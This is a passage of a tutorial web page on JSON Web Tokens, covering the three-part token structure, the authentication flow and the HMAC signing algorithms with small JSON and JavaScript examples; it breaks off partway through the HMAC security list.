class="table_of_contents-link" href="#2cf562ad-76f0-8055-90a7-f49dd8cfb437"><strong>Python/Flask - Complete Example</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2cf562ad-76f0-80e9-bb39-f2dc00183276"><strong>Real-World Scenarios</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-8003-a8f0-e4c8725e39d2"><strong>Scenario 1: Single Page Application (SPA)</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-80e0-b170-e33aec955225"><strong>Scenario 2: Microservices Architecture</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-80ac-9ec9-d4e966f6c991"><strong>Scenario 3: Mobile Application</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-8003-8334-caa3f0ad4ef3"><strong>Scenario 4: Third-Party API Integration</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2cf562ad-76f0-80fd-8b53-c60e4f5b5a45"><strong>Summary</strong></a></div></nav></div><div style="display:contents" dir="auto"><h2 id="2cf562ad-76f0-80a4-9a03-f68041a04d2d" class=""><strong>Introduction</strong></h2></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-8005-bb37-d9aa4ee7639b" class="">JSON Web Token (JWT) is an open standard (RFC 7519) that defines a compact and self-contained way for securely transmitting information between parties as a JSON object. This information can be verified and trusted because it is digitally signed.</p></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-8008-bcd9-d6940b78b76b" class=""><strong>What JWT is Used For</strong></h3></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-807d-92ff-d8291c2bcea3" class="">JWTs are commonly used for:</p></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80c6-9d44-dbd266bd1f51" class="bulleted-list"><li style="list-style-type:disc"><strong>Authentication</strong>: Verifying user identity</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8092-af03-c79cde1f8339" class="bulleted-list"><li style="list-style-type:disc"><strong>Authorization</strong>: Determining user permissions and roles</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80a7-b57c-f1097ca6500d" class="bulleted-list"><li style="list-style-type:disc"><strong>Information Exchange</strong>: Securely transmitting data between parties</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80b2-bcb5-c4fb06de61d4" class="bulleted-list"><li style="list-style-type:disc"><strong>Session Management</strong>: Stateless session tokens</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8023-9046-f936c81649a7" class="bulleted-list"><li style="list-style-type:disc"><strong>API Authentication</strong>: Authenticating API requests</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8053-bd57-f7edc1d8cf3e" class="bulleted-list"><li style="list-style-type:disc"><strong>Single Sign-On (SSO)</strong>: Sharing authentication between multiple applications</li></ul></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-800f-a8b0-ff578495bdb7" class=""><strong>Why Use JWT?</strong></h3></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-80da-a5bc-ecbf14180ca0" class=""><strong>Advantages:</strong></p></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80ae-b102-ce8b6671084d" class="bulleted-list"><li style="list-style-type:disc">✅ <strong>Stateless</strong>: No need to store session data on server</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8054-858b-fd46fb07d526" class="bulleted-list"><li style="list-style-type:disc">✅ <strong>Scalable</strong>: Works across multiple servers without shared storage</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8018-a9dd-d718e9749d4f" class="bulleted-list"><li style="list-style-type:disc">✅ <strong>Self-contained</strong>: Includes all necessary information</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8074-a22e-fd1e2478be31" class="bulleted-list"><li style="list-style-type:disc">✅ <strong>Cross-domain</strong>: Can be used across different domains</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-809f-8424-ebdc6ce49125" class="bulleted-list"><li style="list-style-type:disc">✅ <strong>Standardized</strong>: Industry-standard format (RFC 7519)</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8061-b19b-ea2327c2edf0" class="bulleted-list"><li style="list-style-type:disc">✅ <strong>Compact</strong>: Small size, easy to transmit</li></ul></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-80a1-9b3f-df2565bba143" class=""><strong>Disadvantages:</strong></p></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80ec-8c84-cc99fc4dd55e" class="bulleted-list"><li style="list-style-type:disc">⚠️ <strong>Larger size</strong>: More data than simple session IDs</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80c7-ac3f-dec6bbe2a437" class="bulleted-list"><li style="list-style-type:disc">⚠️ <strong>Cannot revoke easily</strong>: Difficult to invalidate before expiration</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8099-8254-d6b24406c213" class="bulleted-list"><li style="list-style-type:disc">⚠️ <strong>Security depends on implementation</strong>: Must be implemented correctly</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-801b-b0f7-ebb593a47264" class="bulleted-list"><li style="list-style-type:disc">⚠️ <strong>Token theft risk</strong>: If stolen, can be used until expiration</li></ul></div><div style="display:contents" dir="auto"><hr id="2cf562ad-76f0-8057-b699-c1cadf4e896f"/></div><div style="display:contents" dir="auto"><h2 id="2cf562ad-76f0-80d7-a704-ff007a658cc3" class=""><strong>What is JWT</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-8064-92a3-f9d383a39bee" class=""><strong>Definition</strong></h3></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-80fb-9209-e04f99f28574" class="">A JWT is a compact, URL-safe token that consists of three parts separated by dots (<code>.</code>):</p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-80ab-a36d-fa8c20a9af99" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">header.payload.signature
+</code></pre></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-80bc-9a17-e46580b2d5eb" class=""><strong>Example:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-80bb-8a09-ecf5e0b8d8e8" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiIxMjMiLCJ1c2VybmFtZSI6ImpvaG4ifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-8054-b0d5-c6f01478626f" class=""><strong>Key Characteristics</strong></h3></div><div style="display:contents" dir="auto"><ol type="1" id="2cf562ad-76f0-80f8-827d-d90f20aa788d" class="numbered-list" start="1"><li><strong>Compact</strong>: Small size makes it easy to transmit via URL, POST parameter, or HTTP header</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2cf562ad-76f0-80d7-b89f-c510a7359634" class="numbered-list" start="2"><li><strong>Self-contained</strong>: Contains all necessary information (claims) about the user</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2cf562ad-76f0-8007-8afd-f77eabaf5c92" class="numbered-list" start="3"><li><strong>Stateless</strong>: Server doesn&#x27;t need to store session data</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2cf562ad-76f0-80fd-b10f-d637fd3ff687" class="numbered-list" start="4"><li><strong>Signed</strong>: Digitally signed to ensure integrity and authenticity</li></ol></div><div style="display:contents" dir="auto"><hr id="2cf562ad-76f0-804b-9561-d1a3ed8a01ba"/></div><div style="display:contents" dir="auto"><h2 id="2cf562ad-76f0-806f-91cc-cc2ad318def6" class=""><strong>JWT Structure</strong></h2></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-80f4-8b22-c0ddea917f4b" class="">A JWT consists of three parts:</p></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-808a-b2b4-e94f75877a23" class=""><strong>1. Header</strong></h3></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-807d-bfa6-d767d7d02fb1" class="">The header typically consists of two parts:</p></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80b3-ab61-e8189eb7b042" class="bulleted-list"><li style="list-style-type:disc"><strong>Type (typ)</strong>: Usually &quot;JWT&quot;</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8094-a395-c1654e914c12" class="bulleted-list"><li style="list-style-type:disc"><strong>Algorithm (alg)</strong>: The signing algorithm (e.g., HS256, RS256, ES256)</li></ul></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-8034-8ba8-e416e6ae1891" class=""><strong>Example Header:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-808f-b05a-fc316e9b0447" class="code code-wrap"><code class="language-JSON" style="white-space:pre-wrap;word-break:break-all">{
+  &quot;alg&quot;: &quot;HS256&quot;,
+  &quot;typ&quot;: &quot;JWT&quot;
+}
+</code></pre></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-8061-82d1-e26952e3ddc4" class=""><strong>Encoded:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-805c-875a-c2f58d8d0f04" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-8035-8991-de754e4130f8" class=""><strong>2. Payload</strong></h3></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-80af-80ae-dbd0c5f5d6cb" class="">The payload contains the <strong>claims</strong>. Claims are statements about an entity (typically the user) and additional data.</p></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-80fe-9627-f4fb5c7b0635" class=""><strong>Types of Claims:</strong></p></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8043-976a-c1c863214ff2" class="bulleted-list"><li style="list-style-type:disc"><strong>Registered Claims</strong>: Pre-defined claims (exp, iat, iss, aud, etc.)</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8049-91b3-d300c081552a" class="bulleted-list"><li style="list-style-type:disc"><strong>Public Claims</strong>: Claims defined in the JWT registry</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-809e-914d-cb2192d2954f" class="bulleted-list"><li style="list-style-type:disc"><strong>Private Claims</strong>: Custom claims specific to your application</li></ul></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-809e-acd5-d6b6e2dac0e3" class=""><strong>Example Payload:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-8082-aa05-d61665689f07" class="code code-wrap"><code class="language-JSON" style="white-space:pre-wrap;word-break:break-all">{
+  &quot;userId&quot;: &quot;123&quot;,
+  &quot;username&quot;: &quot;john&quot;,
+  &quot;email&quot;: &quot;john@example.com&quot;,
+  &quot;role&quot;: &quot;admin&quot;,
+  &quot;iat&quot;: 1516239022,
+  &quot;exp&quot;: 1516242622
+}
+</code></pre></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-80e4-9d70-ea9ab6c024e3" class=""><strong>Encoded:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-80be-b12a-f7c59db529bc" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">eyJ1c2VySWQiOiIxMjMiLCJ1c2VybmFtZSI6ImpvaG4iLCJlbWFpbCI6ImpvaG5AZXhhbXBsZS5jb20iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE1MTYyMzkwMjIsImV4cCI6MTUxNjI0MjYyMn0
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-8080-9418-cd61b9ef926a" class=""><strong>3. Signature</strong></h3></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-80af-ad20-e01f1c66db66" class="">The signature is created using:</p></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8080-84d5-e24cf5ae4898" class="bulleted-list"><li style="list-style-type:disc">The encoded header</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8061-b152-f6323db8ca40" class="bulleted-list"><li style="list-style-type:disc">The encoded payload</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-806f-bdea-cb9e2aae18f2" class="bulleted-list"><li style="list-style-type:disc">A secret (for HMAC) or private key (for RSA/ECDSA)</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-800c-9366-d40d95252ae7" class="bulleted-list"><li style="list-style-type:disc">The algorithm specified in the header</li></ul></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-807f-b897-e80bb2e2ed55" class=""><strong>For HMAC SHA256:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-8001-9d95-ec1a7a1ebaff" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">HMACSHA256(
+  base64UrlEncode(header) + &quot;.&quot; + base64UrlEncode(payload),
+  secret
+)
+</code></pre></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-8077-885c-ef4bc0ca3961" class=""><strong>Complete JWT:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-8089-91b1-fa501a33dbba" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">header.payload.signature
+</code></pre></div><div style="display:contents" dir="auto"><hr id="2cf562ad-76f0-80df-94bb-e2379e1a11fc"/></div><div style="display:contents" dir="auto"><h2 id="2cf562ad-76f0-802f-a92b-e508cae68dc1" class=""><strong>How JWT Works</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-80f7-b68f-fb60b035fe74" class=""><strong>JWT Authentication Flow</strong></h3></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-800f-a5e6-e885a587ce89" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">1. User Login
+   ┌─────────┐
+   │  User   │
+   └────┬────┘
+        │ 1. Sends credentials
+        ▼
+   ┌─────────────┐
+   │   Server    │
+   └────┬────────┘
+        │ 2. Validates credentials
+        │ 3. Creates JWT with user claims
+        │ 4. Signs JWT with secret key
+        ▼
+   ┌─────────────────┐
+   │  JWT Token      │
+   │  (sent to user) │
+   └─────────────────┘
+
+2. Accessing Protected Resources
+   ┌─────────┐
+   │  User   │
+   └────┬────┘
+        │ 5. Sends request with JWT in Authorization header
+        ▼
+   ┌─────────────┐
+   │   Server    │
+   └────┬────────┘
+        │ 6. Verifies JWT signature
+        │ 7. Validates claims (exp, iat, etc.)
+        │ 8. Extracts user information from payload
+        │ 9. Grants/denies access
+        ▼
+   ┌─────────────┐
+   │  Response   │
+   └─────────────┘
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-80d9-b9f1-d7fc84506924" class=""><strong>Step-by-Step Process</strong></h3></div><div style="display:contents" dir="auto"><ol type="1" id="2cf562ad-76f0-80b2-a361-fb3dd2f305da" class="numbered-list" start="1"><li><strong>User Authentication</strong><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80dd-8445-f7b9e11be491" class="bulleted-list"><li style="list-style-type:disc">User provides credentials (username/password)</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80d3-b54d-f287effb45b5" class="bulleted-list"><li style="list-style-type:disc">Server validates credentials</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8070-8bc0-f177f480f4fb" class="bulleted-list"><li style="list-style-type:disc">If valid, server creates JWT</li></ul></div></li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2cf562ad-76f0-80b3-861a-c9bbdcd3162d" class="numbered-list" start="2"><li><strong>JWT Creation</strong><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8002-bd28-da235217cb96" class="bulleted-list"><li style="list-style-type:disc">Server creates header with algorithm</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80b5-99eb-eed000fa89f5" class="bulleted-list"><li style="list-style-type:disc">Server creates payload with user claims</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-806f-938c-e626a908d320" class="bulleted-list"><li style="list-style-type:disc">Server signs token using secret key</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80cc-a522-e6e89dd5fb6a" class="bulleted-list"><li style="list-style-type:disc">Server sends JWT to client (usually in response body or cookie)</li></ul></div></li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2cf562ad-76f0-80b8-b15d-cac767d252b7" class="numbered-list" start="3"><li><strong>Token Storage (Client)</strong><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80ac-b7fa-dd62bece26ee" class="bulleted-list"><li style="list-style-type:disc">Client stores JWT (localStorage, sessionStorage, or httpOnly cookie)</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80b5-a7a3-f52f124f1d9c" class="bulleted-list"><li style="list-style-type:disc">Client includes JWT in subsequent requests</li></ul></div></li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2cf562ad-76f0-8072-9d84-d77c5fe49a7f" class="numbered-list" start="4"><li><strong>Request Authorization</strong><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8052-85e2-e42f5db50d74" class="bulleted-list"><li style="list-style-type:disc">Client sends request with JWT in <code>Authorization: Bearer &lt;token&gt;</code> header</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8009-a55c-ec81fa66e99d" class="bulleted-list"><li style="list-style-type:disc">Server receives request and extracts JWT</li></ul></div></li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2cf562ad-76f0-8061-95f9-cf9395ad0a00" class="numbered-list" start="5"><li><strong>Token Verification</strong><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8071-a663-c11595cae9bb" class="bulleted-list"><li style="list-style-type:disc">Server verifies signature using secret key</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-801f-83a7-f16c55401f7f" class="bulleted-list"><li style="list-style-type:disc">Server validates claims (expiration, issuer, audience, etc.)</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80f5-8911-ef6fade38ce5" class="bulleted-list"><li style="list-style-type:disc">Server extracts user information from payload</li></ul></div></li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2cf562ad-76f0-80b2-8b7d-df2a991692ac" class="numbered-list" start="6"><li><strong>Authorization</strong><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8066-b432-d6d00601a5a1" class="bulleted-list"><li style="list-style-type:disc">Server checks user permissions/roles from token claims</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80bb-bffb-c9b9cbf71bc6" class="bulleted-list"><li style="list-style-type:disc">Server grants or denies access to requested resource</li></ul></div></li></ol></div><div style="display:contents" dir="auto"><hr id="2cf562ad-76f0-807f-a27f-c2822c7e12e6"/></div><div style="display:contents" dir="auto"><h2 id="2cf562ad-76f0-804c-8c7d-dcfbbe16a1dd" class=""><strong>JWT Algorithms</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-8093-8bd1-fdeb379c810c" class=""><strong>Algorithm Types</strong></h3></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-80b1-8171-fe0127148236" class="">JWTs support several signing algorithms:</p></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-8061-9f50-c3298f5f5a9f" class=""><strong>1. HMAC (Symmetric)</strong></h3></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-801b-ab4a-ce1b5140b678" class=""><strong>Algorithms:</strong></p></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8062-a495-e7fd650df8c8" class="bulleted-list"><li style="list-style-type:disc"><code>HS256</code>: HMAC using SHA-256</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8059-b1ca-e1b54f431dd1" class="bulleted-list"><li style="list-style-type:disc"><code>HS384</code>: HMAC using SHA-384</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80b4-98f2-c68b23fd29a6" class="bulleted-list"><li style="list-style-type:disc"><code>HS512</code>: HMAC using SHA-512</li></ul></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-80e0-8900-ce17ee62807e" class=""><strong>Full Name:</strong> Hash-based Message Authentication Code</p></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-80d7-b057-c974201ab8e3" class=""><strong>How it works:</strong></p></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80ae-b1a9-eb815e465b5d" class="bulleted-list"><li style="list-style-type:disc">Same secret key used for signing and verification</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8081-84c6-ca55d55b7290" class="bulleted-list"><li style="list-style-type:disc">Secret key must be shared between all parties</li></ul></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-8085-ab6a-e52df8ff59fc" class=""><strong>Example:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-80e4-b8a6-d12eb569aedf" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Secret key (same for signing and verifying)
+const secret = &#x27;your-secret-key&#x27;;
+
+// Sign
+const token = jwt.sign(payload, secret, { algorithm: &#x27;HS256&#x27; });
+
+// Verify
+const decoded = jwt.verify(token, secret, { algorithms: [&#x27;HS256&#x27;] });
+</code></pre></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-8064-be6e-f8b9301f6cbd" class=""><strong>Use Cases:</strong></p></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80dd-a0bd-cc8fe2b06fc1" class="bulleted-list"><li style="list-style-type:disc">Single-server applications</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80f0-a2a8-ef5a35970909" class="bulleted-list"><li style="list-style-type:disc">When secret key can be securely shared</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80d2-9b08-c5b8be3d366e" class="bulleted-list"><li style="list-style-type:disc">Simple authentication scenarios</li></ul></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-80f8-9e11-c00dc9fdaa9f" class=""><strong>Security:</strong></p></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8050-b4c0-debd014dfbcb" class="bulleted-list"><li style="list-style-type:disc">✅ Fast and efficient</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8082-8f5d-cd83c054efb3" class="bulleted-list"><li 